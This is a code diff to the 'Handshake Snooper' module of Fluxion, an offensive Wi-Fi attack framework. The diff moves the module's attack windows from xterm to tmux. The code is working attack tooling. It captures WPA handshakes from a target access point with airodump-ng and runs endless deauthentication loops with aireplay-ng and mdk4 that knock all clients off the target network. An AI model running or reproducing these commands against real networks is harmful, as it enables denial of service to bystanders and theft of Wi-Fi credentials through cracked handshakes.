@@ -20,12 +20,12 @@ handshake_snooper_arbiter_daemon() {
   if [ ${#@} -lt 1 -o "$HandshakeSnooperState" != "Running" ]; then
     return 1;
   fi
-
+	
   # Start daemon in the running state to continue execution until aborted,
   # or until a hash has been verified to exist in the capture file.
   # NOTE: The line below must remain before trap to prevent race conditions.
   local handshake_snooper_arbiter_daemon_state="running"
-
+	
   handshake_snooper_arbiter_daemon_abort() {
     handshake_snooper_arbiter_daemon_state="aborted"
     if [ "$handshake_snooper_arbiter_daemon_viewerPID" ]; then
@@ -40,7 +40,7 @@ handshake_snooper_arbiter_daemon() {
       "$FLUXIONWorkspacePath/handshake_snooper.log"
     exit 2
   }
-
+	
   trap handshake_snooper_arbiter_daemon_abort SIGABRT
 
   source "$FLUXIONLibPath/HashUtils.sh"
@@ -50,22 +50,33 @@ handshake_snooper_arbiter_daemon() {
   sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/dump-*"
 
   # Display some feedback to the user to assure verifier is working.
-  xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg "#000000" -fg "#CCCCCC" \
-    -title "Handshake Snooper Arbiter Log" -e \
-    "tail -f \"$FLUXIONWorkspacePath/handshake_snooper.log\"" &
-  local handshake_snooper_arbiter_daemon_viewerPID=$!
+  #xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg "#000000" -fg "#CCCCCC" \
+   # -title "Handshake Snooper Arbiter Log" -e \
+    #"tail -f \"$FLUXIONWorkspacePath/handshake_snooper.log\"" &
+  #local handshake_snooper_arbiter_daemon_viewerPID=$!
+
+	
+	tmux new-window -n handshake-snooper 'tail' '-f' $FLUXIONWorkspacePath/'handshake_snooper.log' &
+    local handshake_snooper_arbiter_daemon_viewerPID=$!
+	
+
 
   local now=$(env -i date '+%H:%M:%S')
   echo -e "[$now] $HandshakeSnooperStartingArbiterNotice" > \
     "$FLUXIONWorkspacePath/handshake_snooper.log"
 
-  handshake_snooper_start_captor
+  #handshake_snooper_start_captor
+  #handshake_snooper_start_deauthenticator
+	
   handshake_snooper_start_deauthenticator
-
+  handshake_snooper_start_captor
+  
   local handshake_snooper_arbiter_daemon_verified=1 # Assume it hasn't been verified yet (1 => false/error).
 
   # Keep snooping and verifying until we've got a valid hash from the capture file.
   while [ $handshake_snooper_arbiter_daemon_verified -ne 0 ]; do
+   
+
     now=$(env -i date '+%H:%M:%S')
     echo -e "[$now] $(io_dynamic_output $HandshakeSnooperSnoopingForNSecondsNotice)" >> \
       "$FLUXIONWorkspacePath/handshake_snooper.log"
@@ -107,12 +118,14 @@ handshake_snooper_arbiter_daemon() {
 
       handshake_snooper_start_captor
       handshake_snooper_start_deauthenticator
+      
     fi
   done
 
   # Assure all processes are stopped before proceeding.
   handshake_snooper_stop_deauthenticator
   handshake_snooper_stop_captor
+
 
   local completionTime=$(env -i date '+%H:%M:%S')
   echo -e "[$completionTime] $HandshakeSnooperArbiterSuccededNotice" >> \
@@ -129,43 +142,55 @@ handshake_snooper_arbiter_daemon() {
 
   # Signal parent process the verification terminated.
   kill -s SIGABRT $1
+  
 }
 
-handshake_snooper_stop_captor() {
-  if [ "$HandshakeSnooperCaptorPID" ]; then
-    kill -s SIGINT $HandshakeSnooperCaptorPID &> $FLUXIONOutputDevice
-  fi
 
+
+handshake_snooper_stop_captor() {
+  #if [ "$HandshakeSnooperCaptorPID" ]; then
+    #kill -s SIGINT $HandshakeSnooperCaptorPID &> $FLUXIONOutputDevice
+   if tmux list-windows -F '#W' | grep -q "^handshake-captor\$"; then
+    tmux kill-window -t fluxion:handshake-captor &> $FLUXIONOutputDevice
+   fi
+  #fi
+	
   HandshakeSnooperCaptorPID=""
 }
 
 handshake_snooper_start_captor() {
+	
   if [ "$HandshakeSnooperCaptorPID" ]; then return 0; fi
   if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi
 
   handshake_snooper_stop_captor
 
-  xterm $FLUXIONHoldXterm -title "Handshake Captor (CH $FluxionTargetChannel)" \
-    $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e \
-    airodump-ng --ignore-negative-one -d $FluxionTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $FluxionTargetChannel -a $HandshakeSnooperJammerInterface &
-  local parentPID=$!
-
-  while [ ! "$HandshakeSnooperCaptorPID" ]; do
-    sleep 1 &
-    wait $!
-    HandshakeSnooperCaptorPID=$(pgrep -P $parentPID)
-  done
+  #xterm $FLUXIONHoldXterm -title "Handshake Captor (CH $FluxionTargetChannel)" \
+   # $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e \
+    #airodump-ng --ignore-negative-one -d $FluxionTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $FluxionTargetChannel -a $HandshakeSnooperJammerInterface &
+  #local parentPID=$!
+	
+	tmux new-window -n handshake-captor 'airodump-ng' '--ignore-negative-one' '-d' $FluxionTargetMAC '-w' $FLUXIONWorkspacePath/'capture/dump' '-c' $FluxionTargetChannel $HandshakeSnooperJammerInterface &
+	local parentPID=$!
+  #while [ ! "$HandshakeSnooperCaptorPID" ]; do
+   # sleep 1 &
+    ##wait $!
+    #HandshakeSnooperCaptorPID=$(pgrep -P $parentPID)
+  #done
 }
 
 handshake_snooper_stop_deauthenticator() {
-  if [ "$HandshakeSnooperDeauthenticatorPID" ]; then
-    kill $HandshakeSnooperDeauthenticatorPID &> $FLUXIONOutputDevice
-  fi
+ # if [ "$HandshakeSnooperDeauthenticatorPID" ]; then
+    #kill $HandshakeSnooperDeauthenticatorPID &> $FLUXIONOutputDevice
+    if tmux list-windows -F '#W' | grep -q "^deauth\$"; then
+		tmux kill-window -t fluxion:deauth &> $FLUXIONOutputDevice
+    fi
 
   HandshakeSnooperDeauthenticatorPID=""
 }
 
 handshake_snooper_start_deauthenticator() {
+	
   if [ "$HandshakeSnooperDeauthenticatorPID" ]; then return 0; fi
   if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi
 
@@ -180,16 +205,22 @@ handshake_snooper_start_deauthenticator() {
   # Start deauthenticators.
   case "$HandshakeSnooperDeauthenticatorIdentifier" in
     "$HandshakeSnooperAireplayMethodOption")
-      xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-        -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
-      HandshakeSnooperDeauthenticatorPID=$!
+      #xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+       # -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+        #"while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
+      #HandshakeSnooperDeauthenticatorPID=$!
+   
+    tmux new-window -n deauth "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
+     HandshakeSnooperDeauthenticatorPID=$!
     ;;
     "$HandshakeSnooperMdk4MethodOption")
-            xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-                -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-                "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done" &
-            HandshakeSnooperDeauthenticatorPID=$!
+    #        xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+     #           -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+      #          "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done" &
+       #     HandshakeSnooperDeauthenticatorPID=$!
+    
+    tmux new-window -n deauth "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done" &
+    HandshakeSnooperDeauthenticatorPID=$!
     ;;
   esac
 }
@@ -361,6 +392,7 @@ handshake_snooper_set_verifier_synchronicity() {
       return 1
       ;;
   esac
+  
 }
 
 
@@ -495,9 +527,8 @@ start_attack() {
   if [ "$HandshakeSnooperState" = "Running" ]; then return 0; fi
   if [ "$HandshakeSnooperState" != "Ready" ]; then return 1; fi
   HandshakeSnooperState="Running"
-
+	
   handshake_snooper_arbiter_daemon $$ &> $FLUXIONOutputDevice &
   HandshakeSnooperArbiterPID=$!
 }
-
 # FLUXSCRIPT END
